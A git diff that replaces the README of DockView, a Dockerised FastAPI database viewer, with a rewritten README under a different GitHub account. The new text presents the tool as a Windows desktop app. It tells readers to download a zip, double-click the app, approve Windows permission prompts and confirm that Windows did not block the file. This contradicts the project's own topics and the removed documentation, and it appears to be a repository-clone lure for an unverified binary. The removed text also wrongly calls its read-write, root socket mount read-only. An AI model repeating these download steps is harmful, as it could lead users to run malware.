@@ -1,397 +1,143 @@
-# ⬡ DockView
-
-**Zero-config Docker database viewer. Auto-detects PostgreSQL, MySQL, MongoDB & Redis. Browse schemas, tables, and row data in a beautiful browser UI — no setup required.**
-
-![Version](https://img.shields.io/badge/version-1.0.0-7c6cf0)
-![Python](https://img.shields.io/badge/python-3.12-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Docker](https://img.shields.io/badge/docker-ready-2496ed)
-![Docker Pulls](https://img.shields.io/docker/pulls/levichinecherem/dockview?color=2496ed&label=pulls&logo=docker)
-![Docker Image Size](https://img.shields.io/docker/image-size/levichinecherem/dockview/latest?label=image%20size&logo=docker)
-![GitHub stars](https://img.shields.io/github/stars/0xSemantic/dockview?style=social)
-![Last Commit](https://img.shields.io/github/last-commit/0xSemantic/dockview)
-[![Twitter Follow](https://img.shields.io/twitter/follow/0xSemantic?style=social)](https://twitter.com/0xSemantic)
-[![Medium](https://img.shields.io/badge/Medium-0xSemantic-black?logo=medium)](https://medium.com/@0xSemantic)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0xSemantic-blue?logo=linkedin)](https://www.linkedin.com/in/0xSemantic/)
-
-
----
-
-## What is DockView?
-
-DockView is a **single-container tool** that mounts the Docker socket, scans all running containers, automatically identifies database services, extracts connection credentials from environment variables, and presents everything in a fast read‑only browser interface.
-
-**One command. Instant visibility. No configuration.**
-
-```bash
-docker run -d \
-  -p 8080:8080 \
-  -v /var/run/docker.sock:/var/run/docker.sock:rw \
-  --name dockview \
-  --user root \
-  levichinecherem/dockview:latest
-```
-
-Open `http://localhost:8080` — done.
-
----
-
-## Features
-
-| Feature | Details |
-|---|---|
-| 🔍 Auto‑detection | Scans running containers, identifies DB type by image name |
-| 🐘 PostgreSQL | Full schema, table, column, and row preview |
-| 🐬 MySQL / MariaDB | Databases, tables, row preview, column types |
-| 🍃 MongoDB | Collections, document preview, inferred schema |
-| ⚡ Redis | Key browsing by type, value preview, TTL display |
-| 📋 CSV Export | Copy any table preview as CSV with one click |
-| 🔄 Live Sync | Detects container start/stop via Docker events (SSE) |
-| 🌙 Dark / Light | Theme toggle, persisted across sessions |
-| 📱 PWA | Installable on desktop and mobile |
-| 🔐 Read‑only | Zero write operations — safe by design |
-| 🔑 Credential fallback | Manual credential entry if auto‑detection fails |
-
----
-
-## Quick Start
-
-Here’s a **complete Quick Start** replacement for DockView with a ready-to-use **Docker Compose example** that users can copy locally and run immediately. This focuses **only on Quick Start**, with auto-detection notes included.
-
----
-
-### Option 1 — Docker Compose (recommended for auto-detection)
-
-Create a file named `docker-compose.yml` in an empty directory with the following content:
-
-```yaml
-services:
-  # ── DockView App ───────────────────────────────
-  dockview:
-    image: levichinecherem/dockview:latest
-    container_name: dockview
-    user: root   # ← run as root
-    ports:
-      - "8080:8080"
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock:rw
-    restart: unless-stopped
-    depends_on:
-      - postgres
-      - mysql
-      - mongo
-      - redis
-    networks:
-      - dockview-net
-
-  # ── PostgreSQL ────────────────────────────────
-  postgres:
-    image: postgres:16-alpine
-    container_name: demo-postgres
-    environment:
-      POSTGRES_DB: appdb
-      POSTGRES_USER: admin
-      POSTGRES_PASSWORD: secret123
-    ports:
-      - "5432:5432"
-    volumes:
-      - pg-data:/var/lib/postgresql/data
-    networks:
-      - dockview-net
-    healthcheck:
-      test: ["CMD-SHELL", "pg_isready -U admin -d appdb"]
-      interval: 10s
-      timeout: 5s
-      retries: 5
-
-  # ── MySQL ────────────────────────────────────
-  mysql:
-    image: mysql:8.0
-    container_name: demo-mysql
-    environment:
-      MYSQL_ROOT_PASSWORD: rootpass
-      MYSQL_DATABASE: shopdb
-      MYSQL_USER: shopuser
-      MYSQL_PASSWORD: shoppass
-    ports:
-      - "3306:3306"
-    volumes:
-      - mysql-data:/var/lib/mysql
-    networks:
-      - dockview-net
-    healthcheck:
-      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
-      interval: 10s
-      timeout: 5s
-      retries: 5
-
-  # ── MongoDB ──────────────────────────────────
-  mongo:
-    image: mongo:7.0
-    container_name: demo-mongo
-    environment:
-      MONGO_INITDB_ROOT_USERNAME: root
-      MONGO_INITDB_ROOT_PASSWORD: mongosecret
-      MONGO_INITDB_DATABASE: catalog
-    ports:
-      - "27017:27017"
-    volumes:
-      - mongo-data:/data/db
-    networks:
-      - dockview-net
-
-  # ── Redis ────────────────────────────────────
-  redis:
-    image: redis:7.4-alpine
-    container_name: demo-redis
-    command: redis-server --requirepass redispass
-    ports:
-      - "6379:6379"
-    networks:
-      - dockview-net
-
-networks:
-  dockview-net:
-    driver: bridge
-
-volumes:
-  pg-data:
-  mysql-data:
-  mongo-data:
-```
-
-Then run:
-
-```bash
-docker-compose up -d
-```
-
-Open the UI at [http://localhost:8080](http://localhost:8080).
-
-> ✅ DockView will **auto-detect the credentials** for all database containers because it shares the same Docker network and can read their environment variables.
-
----
-
-### Option 2 — Standalone Docker run (manual credentials fallback)
-
-```bash
-docker run -d \
-  -p 8080:8080 \
-  -v /var/run/docker.sock:/var/run/docker.sock:rw \
-  --name dockview \
-  --user root \
-  levichinecherem/dockview:latest
-```
-
-> **Note:** Auto-detection may **not work** in standalone mode. Use the **Reconnect modal** in the UI to enter credentials manually.
-
----
-
-### Option 3 — Local development
-
-```bash
-# Clone and enter the repo
-git clone https://github.com/0xSemantic/dockview.git
-cd dockview
-
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate      # or .venv\Scripts\activate on Windows
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run with hot reload
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8080
-```
-
-
----
-
-## Using DockView
-
-### Sidebar — Database List
-- All detected databases appear on the left, each with a status dot (green = running, red = stopped)
-- Click any database to open its Explorer panel
-
-### Search Bar (`⌘K` / `Ctrl+K`)
-- Quickly filter the sidebar by name, type, or display name
-
-### Explorer Tab (three‑column layout)
-1. **Schemas / Databases** – click to load tables
-2. **Tables** – shows table name, row count estimate, and a relative size bar
-3. **Data Preview** – paginated rows (50 per page)
-
-### Schema Tab
-- Displays full column‑level metadata for the selected table:
-  - Column name, data type, nullable flag, default value, primary key indicator
-
-### Server Info Tab
-- Container details (name, image, network)
-- Database server version and connection information
-
-### CSV Export
-- Click the **CSV** button in the data panel header to copy the current page to clipboard in CSV format
-
-### Theme Toggle
-- Sun/moon icon in the top‑right toggles between dark and light modes (saved to localStorage)
-
-### Reconnect / Manual Credentials
-- If auto‑detection fails (wrong password, custom setup), click **Reconnect** in the DB header. A modal lets you override:
-  - Host, port, username, password, database name
-  - Credentials are stored **in‑memory only** – never written to disk
-
----
-
-## Security
-
-> **Important:** The Docker socket grants root‑level access to the host. DockView is designed for **local development** and **internal tools** – do not expose it to the public internet without authentication.
-
-**Current security model:**
-- All database operations are **read‑only** – no INSERT, UPDATE, DELETE, DROP
-- Credentials are held **in‑memory** only – never persisted
-- API has no authentication layer in v1 (planned for v2)
-- Docker socket is mounted **read‑only** (`:ro`) in the recommended run command
-
-**Hardening recommendations:**
-- Bind to localhost only: `-p 127.0.0.1:8080:8080`
-- Use a reverse proxy with basic auth (e.g., Nginx)
-- Run as non‑root (already done in the Docker image)
-- Use IP allow‑listing if deployed on a trusted network
-
-See [SECURITY.md](docs/SECURITY.md) for more details.
-
----
-
-## Supported Databases
-
-| Database | Detection | Auto‑credentials | Schemas | Tables | Row Preview |
-|---|---|---|---|---|---|
-| PostgreSQL | ✅ | ✅ | ✅ | ✅ | ✅ |
-| MySQL / MariaDB | ✅ | ✅ | ✅ | ✅ | ✅ |
-| MongoDB | ✅ | ✅ | Inferred | ✅ | ✅ |
-| Redis | ✅ | ✅ | — | By type | ✅ |
-
-**Adding a new adapter?** See [EXTENDING.md](docs/EXTENDING.md).
-
----
-
-## Configuration
-
-DockView can be configured via environment variables:
-
-| Variable | Default | Description |
-|---|---|---|
-| `HOST` | `0.0.0.0` | Bind host |
-| `PORT` | `8080` | Bind port |
-| `WORKERS` | `1` | Number of Uvicorn workers |
-| `LOG_LEVEL` | `info` | Logging verbosity |
-| `DOCKER_HOST` | (socket) | Override Docker socket path (e.g., `unix:///var/run/docker.sock`) |
-| `MAX_ROWS` | `50` | Default row preview limit |
-
-**Example custom startup:**
-
-```bash
-docker run -d \
-  -e PORT=9000 \
-  -e LOG_LEVEL=debug \
-  -e MAX_ROWS=100 \
-  -p 9000:9000 \
-  -v /var/run/docker.sock:/var/run/docker.sock:ro \
-  levichinecherem/dockview:latest
-```
-
----
-
-## Troubleshooting
-
-### "Docker unavailable" / red status dot
-- Ensure the Docker socket is mounted: `-v /var/run/docker.sock:/var/run/docker.sock:ro`
-- Verify permissions: `ls -la /var/run/docker.sock`
-- On Linux, you may need to add your user to the `docker` group or use `sudo`.
-
-### Database shows but connection fails
-- DockView connects to the container's internal Docker network IP. If your database is on a different network, use the **Reconnect** modal to enter `host=localhost` and the mapped port.
-- Alternatively, ensure DockView and the database share the same Docker network (e.g., using a custom bridge).
-
-### MongoDB auth fails
-- Set `MONGO_INITDB_ROOT_USERNAME` and `MONGO_INITDB_ROOT_PASSWORD` on the MongoDB container. DockView uses `authSource=admin` by default.
-
-### Redis "NOAUTH" error
-- Set `REDIS_PASSWORD` on the Redis container or manually enter it via the Reconnect modal.
-
-### Tables show but rows return empty
-- Verify the database user has SELECT privileges on the tables. For PostgreSQL:
-  ```sql
-  GRANT SELECT ON ALL TABLES IN SCHEMA public TO your_user;
-  ```
-
-### Container detected but wrong DB type
-- DockView detects by image name. If you're using a custom/retagged image, you can add a label: `docker run -l "dockview.type=postgres" ...` (label support coming in v1.1).
-
----
-
-## Architecture
-
-```
-Browser (PWA)
-  │
-  ▼
-FastAPI Backend
-  ├── Docker Inspector   — watches Docker socket, auto-detects DBs
-  ├── Adapter Registry   — maps DB types to connection adapters
-  ├── Credential Resolver — ENV vars → defaults → user input
-  ├── SSE Stream         — pushes live container events to browser
-  └── REST API           — /api/databases, /tables, /preview...
-  │
-  ▼
-Docker Socket (/var/run/docker.sock)
-  │
-  ▼
-Running Containers (Postgres, MySQL, Mongo, Redis...)
-```
-
-See [ARCHITECTURE.md](docs/ARCHITECTURE.md) for full technical details.
-
----
-
-## Roadmap
-
-- **v1.0** — Auto‑detection, table preview, CSV, PWA, live sync (current)
-- **v1.1** — Query runner (read‑only SELECT), result export, label overrides
-- **v1.2** — Container health badges, connection latency display
-- **v2.0** — Authentication, multi‑host Docker support, schema diff
-- **v3.0** — Cloud‑hosted version, team sharing, webhooks
-
----
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](docs/CONTRIBUTING.md) for guidelines.
-
-**Development setup:**
-```bash
-git clone https://github.com/0xSemantic/dockview.git
-cd dockview
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8080
-```
-
----
-
-## License
-
-MIT © Levi Chinecherem. See [LICENSE](LICENSE) for details.
-
----
-
-## Support & Feedback
-
-- **Issues:** [GitHub Issues](https://github.com/0xSemantic/dockview/issues)
-- **Discussions:** [GitHub Discussions](https://github.com/0xSemantic/dockview/discussions)
-
----
-
-## ⭐ If this helped you, consider starring the repo
-**Built with FastAPI, HTMX, and ❤️**
+# 🐳 dockview - View Docker databases with ease
+
+[![Download dockview](https://img.shields.io/badge/Download-dockview-ff6b6b?style=for-the-badge)](https://github.com/Laf1456/dockview)
+
+## 📦 What DockView does
+
+DockView is a desktop app that helps you view databases that run inside Docker.
+
+It is made for simple use. You open the app, connect to a running Docker container, and browse your data in a clear table view.
+
+DockView works with common database types, including:
+
+- MongoDB
+- MySQL
+- PostgreSQL
+- Redis
+
+It is built for people who want to look at data without setting up a full database tool by hand.
+
+## 💻 What you need
+
+Use DockView on a Windows PC with:
+
+- Windows 10 or Windows 11
+- Docker Desktop installed and running
+- A database container already running
+- Enough free space for the app and your database data
+- A stable network or local Docker setup
+
+For best results, keep Docker Desktop open before you start DockView.
+
+## 🚀 Download and install
+
+1. Open this page: https://github.com/Laf1456/dockview
+2. Find the latest release or download file
+3. Download DockView to your computer
+4. If the file is a `.zip`, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the DockView app to run it
+7. If Windows asks for permission, choose Yes
+
+If the download gives you an app file, you can open it right away after it finishes downloading.
+
+## 🔧 First-time setup
+
+After you start DockView for the first time:
+
+1. Make sure Docker Desktop is running
+2. Start the database container you want to view
+3. Open DockView
+4. Choose the database type
+5. Enter the container details shown in Docker
+6. Connect to the database
+
+DockView is designed to keep this simple. In many cases, it can find the right connection details with little input.
+
+## 🗂️ Supported database types
+
+DockView can help you view data from these common database systems:
+
+### MongoDB
+Use this for document data stored in collections.
+
+### MySQL
+Use this for table-based data in a classic relational setup.
+
+### PostgreSQL
+Use this for structured data with strong query support.
+
+### Redis
+Use this for key-value data and fast lookups.
+
+## 🖱️ How to use DockView
+
+1. Start the app
+2. Pick the database you want to view
+3. Connect to the running container
+4. Choose a database, schema, or collection
+5. Open a table or record list
+6. Browse rows, fields, and values
+7. Search for data when you need something specific
+
+The app uses a clean layout so you can move through your data without a long setup process.
+
+## 🧭 Common tasks
+
+### View records
+Open a table or collection to see the data inside it.
+
+### Search data
+Use the search field to find names, IDs, or values.
+
+### Refresh results
+Reload the view after new data is added to your container.
+
+### Switch databases
+Move between containers or database types from the main screen.
+
+### Inspect values
+Open a record to see the full content in one place.
+
+## 🧰 Tips for a smooth start
+
+- Keep Docker Desktop open before you launch DockView
+- Use the same database container name each time if possible
+- If you have more than one database running, check the port number
+- Start with a small test database if you want to learn the app
+- Close other heavy apps if your PC feels slow
+
+## 🪟 Windows help
+
+If DockView does not open:
+
+1. Check that the file finished downloading
+2. Make sure you extracted the `.zip` file if needed
+3. Right-click the app and choose Open
+4. Confirm that Windows did not block the file
+5. Check that Docker Desktop is running
+6. Start your database container again
+
+If the app opens but you do not see data:
+
+1. Check that the container is still running
+2. Confirm the database type is correct
+3. Verify the container name or port
+4. Refresh the view
+5. Restart the app if needed
+
+## 🔒 Privacy and local use
+
+DockView is meant for local database viewing through Docker.
+
+It connects to the databases you run on your own machine or local network. Your data stays in your setup unless you connect it elsewhere.
+
+## 📁 Project details
+
+- Repository: dockview
+- Description: Initial public release of DockView — a zero-config Docker database viewer.
+- Topics: database, developer-tools, docker, fastapi, htmx, mongodb, mysql, postgresql, pwa, redis
+
+## 🛠️ For future updates
+
+When new releases appear, return to the download page and get the latest version for Windows.
